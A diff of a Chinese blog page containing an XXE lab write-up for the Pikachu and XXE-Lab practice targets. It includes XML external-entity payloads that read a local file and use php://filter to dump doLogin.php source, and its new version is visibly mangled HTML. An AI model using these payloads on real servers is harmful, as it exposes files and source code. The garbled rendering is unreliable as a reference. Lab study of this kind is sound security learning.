@@ -6,28 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href>
-  <title>xxe-lab靶场练习专题 | Saw,Learnt,To think</title>
+  <title>xxe-lab | Saw,Learnt,To think</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="0X00 前言学习自, [这里][https://xz.aliyun.com/t/3357#toc-2]和[这里][https://xz.aliyun.com/t/6502]  XXE  XML External Injection 外部实体注入 攻击者通过向服务器注入指定的XML实体内容, 从而让服务器按照指定的配置执行, 服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而">
-<meta name="keywords" content="渗透知识">
+<meta name="keywords" content="渗透小结">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xxe-lab靶场练习专题">
+<meta property="og:title" content="xxe-lab">
 <meta property="og:url" content="/2020/02/23/xxe-lab靶场练习/index.html">
 <meta property="og:site_name" content="Saw,Learnt,To think">
 <meta property="og:description" content="0X00 前言学习自, [这里][https://xz.aliyun.com/t/3357#toc-2]和[这里][https://xz.aliyun.com/t/6502]  XXE  XML External Injection 外部实体注入 攻击者通过向服务器注入指定的XML实体内容, 从而让服务器按照指定的配置执行, 服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="/2020/02/23/xxe-lab靶场练习/1.png">
-<meta property="og:image" content="/2020/02/23/xxe-lab靶场练习/2.png">
-<meta property="og:image" content="/2020/02/23/xxe-lab靶场练习/3.png">
-<meta property="og:image" content="/2020/02/23/xxe-lab靶场练习/4.png">
-<meta property="og:image" content="/2020/02/23/xxe-lab靶场练习/6.png">
-<meta property="og:image" content="/2020/02/23/xxe-lab靶场练习/8.png">
-<meta property="og:image" content="/2020/02/23/xxe-lab靶场练习/11.png">
-<meta property="og:image" content="/2020/02/23/xxe-lab靶场练习/9.png">
-<meta property="og:image" content="/2020/02/23/xxe-lab靶场练习/10.png">
-<meta property="og:updated_time" content="2020-02-23T10:02:39.091Z">
+<meta property="og:updated_time" content="2020-02-28T07:26:53.719Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xxe-lab靶场练习专题">
+<meta name="twitter:title" content="xxe-lab">
 <meta name="twitter:description" content="0X00 前言学习自, [这里][https://xz.aliyun.com/t/3357#toc-2]和[这里][https://xz.aliyun.com/t/6502]  XXE  XML External Injection 外部实体注入 攻击者通过向服务器注入指定的XML实体内容, 从而让服务器按照指定的配置执行, 服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而">
 <meta name="twitter:image" content="/2020/02/23/xxe-lab靶场练习/1.png">
   
@@ -164,7 +156,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      xxe-lab靶场练习专题
+      xxe-lab
     </h1>
   
 
@@ -237,7 +229,7 @@ XML如下编写
 <ul>
 <li><p>外部DTD注入</p>
 <p>XML如下定义</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  #xml定义</span><br><span class="line">  &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">  &lt;!DOCTYPE foo [</span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">  </span><br><span class="line">  #xml编写</span><br><span class="line">  &lt;creds&gt;</span><br><span class="line">      &lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">      &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#xml定义</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">#xml编写</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
 
 <ol>
 <li><p><strong>!ELEMENT foo ANY *<em>, 定义元素为 *</em>ANY</strong> ,即可以接受任何元素</p>
@@ -246,82 +238,46 @@ XML如下编写
 <p> <strong>SYSTEM</strong> 关键字的引用, 文档就会对 c:/test.dtd 文件资源进行引用</p>
 </li>
 <li><p>另外一种引用方式, 引用<strong>公用 DTD</strong> 的方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-</li>
-<li><p>参数实体</p>
-<p>实体有,<code>内置实体 (Built-in entities)</code>, <code>字符实体 (Character entities)</code>, <code>通用实体 (General entities)</code>,<code>参数实体 (Parameter entities)</code>, 这里着重简介参数实体</p>
-<ol>
-<li>使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong></li>
-</ol>
-</li>
-</ul>
-<ol start="2">
-<li><p>只有在 DTD 文件中，参数实体的声明才能引用其他实体</p>
-<ol start="3">
-<li>和通用实体一样，参数实体也可以外部引用</li>
-</ol>
-<p>实例代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  &lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">  &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<ul>
-<li><p>注意实体声明方式使用区别</p>
-<ol>
-<li>参数实体用%实体名称申明，引用时也用<code>%</code>实体名称</li>
-<li>其余实体直接用实体名称申明，引用时用<code>&amp;</code>实体名称</li>
-<li>参数实体只能在<code>DTD</code>中申明，<code>DTD</code>中引用</li>
-<li>其余实体只能在<code>DTD</code>中申明，可在<code>xml</code>文档中引用</li>
-</ol>
-</li>
-</ul>
-<h3 id="0X01-pikachu靶场值XXE"><a href="#0X01-pikachu靶场值XXE" class="headerlink" title="0X01 pikachu靶场值XXE"></a>0X01 pikachu靶场值XXE</h3><ul>
-<li><p>分析</p>
-<p>这里先提交一个正常的xml数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">	&lt;!ENTITY hack &quot;xxe&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;hack;&lt;/test&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure>
 
-<p>显示出了我们定义的内容</p>
-<p><img src="/2020/02/23/xxe-lab靶场练习/2.png" alt="2"></p>
 </li>
-<li><p>操作, 读取本地文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">	&lt;!ENTITY hack SYSTEM &quot;file:///C://test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;hack;&lt;/test&gt;</span><br></pre></td></tr></table></figure>
+</ol>
+<!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  * 参数实体</span><br><span class="line">  </span><br><span class="line">    实体有,`内置实体 (Built-in entities)`, `字符实体 (Character entities)`, `通用实体 (General entities)`,`参数实体 (Parameter entities)`, 这里着重简介参数实体</span><br><span class="line">  </span><br><span class="line">    1. 使用 `% 实体名`(**这里面空格不能少**) 在 DTD 中定义，并且**只能在 DTD 中使用 `%实体名;` 引用**</span><br><span class="line">2. 只有在 DTD 文件中，参数实体的声明才能引用其他实体</span><br><span class="line">    3. 和通用实体一样，参数实体也可以外部引用</span><br><span class="line">  </span><br><span class="line">    实例代码</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/02/23/xxe-lab靶场练习/3.png" alt="3"></p>
-</li>
-<li><p>源码审计</p>
-<p><img src="/2020/02/23/xxe-lab靶场练习/4.png" alt="4"></p>
-<ul>
-<li><p>函数 simplexml_load_string() 将格式正确的 xml 字符串转换为 SimpleXMLElement 对象</p>
-</li>
-<li><p>在PHP里面解析xml用的是libxml，其在 ≥2.9.0 的版本中，默认是禁止解析xml外部实体内容的。</p>
-</li>
-<li><p>为了模拟漏洞，Pikachu平台手动指定 LIBXML_NOENT 选项开启了xml外部实体解析。</p>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="0X02-XXE-Lab"><a href="#0X02-XXE-Lab" class="headerlink" title="0X02 XXE-Lab"></a>0X02 XXE-Lab</h3><ul>
-<li><p>分析</p>
-<p>打开网页, 发现是正常的登入,输入也挺正常的, 打开burpsuite看看数据包</p>
-<p><img src="/2020/02/23/xxe-lab靶场练习/6.png" alt="6"></p>
-<p>数据好像是通过标签传输的, 那么就有很大可能是, XXE漏洞</p>
-</li>
-<li><p>操作</p>
-<p>先正常的利用XXE漏洞, 看看是否成功</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">	&lt;!ENTITY hack &quot;xxe&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;hack;&lt;/test&gt;</span><br></pre></td></tr></table></figure>
+<!ENTITY % an-element "<!ELEMENT mytag (subtag)><p>“&gt; </p>
+<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"><p><br>%an-element; %remote-dtd;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">  * 注意实体声明方式使用区别</span><br><span class="line">  </span><br><span class="line">    1. 参数实体用%实体名称申明，引用时也用`%`实体名称</span><br><span class="line">    2. 其余实体直接用实体名称申明，引用时用`&amp;`实体名称</span><br><span class="line">    3. 参数实体只能在`DTD`中申明，`DTD`中引用</span><br><span class="line">    4. 其余实体只能在`DTD`中申明，可在`xml`文档中引用</span><br><span class="line"></span><br><span class="line">### 0X01 pikachu靶场值XXE</span><br><span class="line"></span><br><span class="line">* 分析</span><br><span class="line"></span><br><span class="line">  这里先提交一个正常的xml数据</span><br></pre></td></tr></table></figure>
 
-<p>查看当前网页源码</p>
-<p><img src="/2020/02/23/xxe-lab靶场练习/8.png" alt="8"></p>
-<p>直接搜索关键字<code>php</code>就搜索到<code>doLogin.php</code>, 同时, 当我们故意输出错误的DTD数据格式时, 会返回错误, 错误信息中存在路径</p>
-<p><img src="/2020/02/23/xxe-lab靶场练习/11.png" alt="11"></p>
-<p>知道了地址, 就可以利用XXE漏洞查看其源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">&lt;!ENTITY hack SYSTEM &quot;php://filter/read=convert.base64-encode/resource=C:/phpStudy/WWW//xxe-lab//php_xxe/doLogin.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;hack;&lt;/username&gt;&lt;password&gt;aaa&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>
+<?xml version="1.0"?>
+<!DOCTYPE test[
+  <!ENTITY hack "xxe">
+<p>]&gt;<br><test>&hack;</test></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  显示出了我们定义的内容</span><br><span class="line"></span><br><span class="line">  ![2](xxe-lab靶场练习/2.png)</span><br><span class="line"></span><br><span class="line">* 操作, 读取本地文件</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/02/23/xxe-lab靶场练习/9.png" alt="9"></p>
-<p>burpsuite的<code>decoder</code>模块base64解密</p>
-<p><img src="/2020/02/23/xxe-lab靶场练习/10.png" alt="10"></p>
-</li>
+<?xml version="1.0"?>
+<!DOCTYPE test[
+  <!ENTITY hack SYSTEM "file:///C://test.txt">
+<p>]&gt;<br><test>&hack;</test></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  ![3](xxe-lab靶场练习/3.png)</span><br><span class="line"></span><br><span class="line">* 源码审计</span><br><span class="line"></span><br><span class="line">  ![4](xxe-lab靶场练习/4.png)</span><br><span class="line"></span><br><span class="line">  * 函数 simplexml_load_string() 将格式正确的 xml 字符串转换为 SimpleXMLElement 对象</span><br><span class="line"></span><br><span class="line">  * 在PHP里面解析xml用的是libxml，其在 ≥2.9.0 的版本中，默认是禁止解析xml外部实体内容的。</span><br><span class="line"></span><br><span class="line">  * 为了模拟漏洞，Pikachu平台手动指定 LIBXML_NOENT 选项开启了xml外部实体解析。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 0X02 XXE-Lab</span><br><span class="line"></span><br><span class="line">* 分析</span><br><span class="line"></span><br><span class="line">  打开网页, 发现是正常的登入,输入也挺正常的, 打开burpsuite看看数据包</span><br><span class="line"></span><br><span class="line">  ![6](xxe-lab靶场练习/6.png)</span><br><span class="line"></span><br><span class="line">  数据好像是通过标签传输的, 那么就有很大可能是, XXE漏洞</span><br><span class="line"></span><br><span class="line">* 操作</span><br><span class="line"></span><br><span class="line">  先正常的利用XXE漏洞, 看看是否成功</span><br></pre></td></tr></table></figure>
+
+<?xml version="1.0"?>
+<!DOCTYPE test[
+  <!ENTITY hack "xxe">
+<p>]&gt;<br><test>&hack;</test></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查看当前网页源码</span><br><span class="line"></span><br><span class="line">![8](xxe-lab靶场练习/8.png)</span><br><span class="line"></span><br><span class="line">直接搜索关键字`php`就搜索到`doLogin.php`, 同时, 当我们故意输出错误的DTD数据格式时, 会返回错误, 错误信息中存在路径</span><br><span class="line"></span><br><span class="line">![11](xxe-lab靶场练习/11.png)</span><br><span class="line"></span><br><span class="line">知道了地址, 就可以利用XXE漏洞查看其源码</span><br></pre></td></tr></table></figure>
+
+<?xml version="1.0"?>
+<!DOCTYPE test[
+<!ENTITY hack SYSTEM "php://filter/read=convert.base64-encode/resource=C:/phpStudy/WWW//xxe-lab//php_xxe/doLogin.php">
+<p>]&gt;<br><user><username>&hack;</username><password>aaa</password></user></p>
+<pre><code>
+![9](xxe-lab靶场练习/9.png)
+
+burpsuite的`decoder`模块base64解密
+
+![10](xxe-lab靶场练习/10.png)
+</code></pre></li>
 </ul>
 
       
@@ -367,7 +323,7 @@ XML如下编写
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透知识</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透小结</a>
         		</li>
       		
 		</ul>
@@ -580,7 +536,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Pikachu靶机系列</a>
+                <a href="javascript:void(0)" class="js-tag color4">Docker容器</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -588,7 +544,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Docker容器</a>
+                <a href="javascript:void(0)" class="js-tag color2">Pikachu靶机系列</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -608,11 +564,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Web网站</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透小结</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透知识</a>
+                <a href="javascript:void(0)" class="js-tag color1">Web网站</a>
               </li>
              
               <li class="article-tag-list-item">
